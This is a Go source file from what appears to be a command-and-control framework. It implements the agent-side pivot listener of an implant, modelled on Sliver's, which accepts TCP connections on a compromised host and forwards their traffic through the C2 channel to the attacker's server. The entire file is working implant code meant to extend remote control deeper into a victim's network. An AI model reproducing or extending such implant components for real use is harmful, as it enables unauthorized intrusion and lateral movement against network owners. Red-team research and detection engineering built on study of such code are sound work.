// Package pivot 提供 Agent 端 Pivot 监听器实现。
// 借鉴 Sliver 的 pivot implant — Agent 作为 TCP/Named Pipe 监听器，
// 将流量通过 C2 通道转发给 Server。
package pivot

import (
	"fmt"
	"io"
	"net"
	"sync"

	"github.com/aegis-c2/aegis/shared"
)

// PivotHandler 处理通过 C2 通道到达 Pivot 的数据。
type PivotHandler func(sessionID string, data []byte) ([]byte, error)

// Listener 是 Agent 端的 Pivot 监听器。
// 在指定端口监听，接受连接后将数据通过 C2 通道转发。
type Listener struct {
	ID        string
	Type      string    // "tcp" | "named_pipe"
	BindAddr  string
	Running   bool
	sessions  map[string]*Session
	mu        sync.RWMutex
	listener  net.Listener
	handler   PivotHandler
	done      chan struct{}
	stopOnce  sync.Once
}

// Session 表示一个通过 Pivot 建立的连接。
type Session struct {
	ID     string
	Conn   net.Conn
	Closed bool
	mu     sync.Mutex
}

// NewTCPListener 创建 TCP Pivot 监听器。
func NewTCPListener(bindAddr string, handler PivotHandler) *Listener {
	return &Listener{
		ID:       shared.GenID("pl"),
		Type:     "tcp",
		BindAddr: bindAddr,
		sessions: make(map[string]*Session),
		handler:  handler,
		done:     make(chan struct{}),
	}
}

// Start 启动监听。
func (l *Listener) Start() error {
	ln, err := net.Listen("tcp", l.BindAddr)
	if err != nil {
		return fmt.Errorf("listen %s: %w", l.BindAddr, err)
	}
	l.listener = ln
	l.Running = true
	go l.acceptLoop()
	return nil
}

func (l *Listener) acceptLoop() {
	defer func() {
		l.mu.Lock()
		l.Running = false
		l.mu.Unlock()
	}()

	for {
		select {
		case <-l.done:
			return
		default:
		}

		conn, err := l.listener.Accept()
		if err != nil {
			return
		}

		sessionID := shared.GenID("ps")
		sess := &Session{
			ID:   sessionID,
			Conn: conn,
		}

		l.mu.Lock()
		l.sessions[sessionID] = sess
		l.mu.Unlock()

		// 通知 handler 新连接建立
		go l.handleSession(sess)
	}
}

func (l *Listener) handleSession(sess *Session) {
	defer func() {
		sess.mu.Lock()
		sess.Closed = true
		sess.Conn.Close()
		sess.mu.Unlock()

		l.mu.Lock()
		delete(l.sessions, sess.ID)
		l.mu.Unlock()
	}()

	buf := make([]byte, 32*1024)
	for {
		sess.mu.Lock()
		if sess.Closed {
			sess.mu.Unlock()
			return
		}
		sess.mu.Unlock()

		n, err := sess.Conn.Read(buf)
		if err != nil {
			if err != io.EOF {
				// 连接异常
			}
			return
		}

		// 将数据通过 C2 通道转发给 Server
		if l.handler != nil {
			resp, err := l.handler(sess.ID, buf[:n])
			if err != nil {
				return
			}
			if len(resp) > 0 {
				if _, werr := sess.Conn.Write(resp); werr != nil {
					return
				}
			}
		}
	}
}

// SendData 通过 C2 通道收到数据后，写入指定会话。
func (l *Listener) SendData(sessionID string, data []byte) error {
	l.mu.RLock()
	sess, ok := l.sessions[sessionID]
	l.mu.RUnlock()

	if !ok {
		return fmt.Errorf("session not found: %s", sessionID)
	}

	sess.mu.Lock()
	defer sess.mu.Unlock()
	if sess.Closed {
		return fmt.Errorf("session closed: %s", sessionID)
	}

	_, err := sess.Conn.Write(data)
	return err
}

// CloseSession 关闭指定会话。
func (l *Listener) CloseSession(sessionID string) {
	l.mu.RLock()
	sess, ok := l.sessions[sessionID]
	l.mu.RUnlock()

	if ok {
		sess.mu.Lock()
		sess.Closed = true
		sess.Conn.Close()
		sess.mu.Unlock()
	}
}

// ListSessions 返回所有活跃会话。
func (l *Listener) ListSessions() []SessionInfo {
	l.mu.RLock()
	defer l.mu.RUnlock()

	var result []SessionInfo
	for id, sess := range l.sessions {
		sess.mu.Lock()
		addr := ""
		if !sess.Closed && sess.Conn != nil && sess.Conn.RemoteAddr() != nil {
			addr = sess.Conn.RemoteAddr().String()
		}
		result = append(result, SessionInfo{
			ID:     id,
			Addr:   addr,
			Closed: sess.Closed,
		})
		sess.mu.Unlock()
	}
	return result
}

// Stop 停止监听器。
func (l *Listener) Stop() error {
	l.stopOnce.Do(func() { close(l.done) })
	if l.listener != nil {
		return l.listener.Close()
	}
	l.Running = false
	return nil
}

// SessionInfo 用于 JSON 序列化的会话信息。
type SessionInfo struct {
	ID     string `json:"id"`
	Addr   string `json:"addr"`
	Closed bool   `json:"closed"`
}
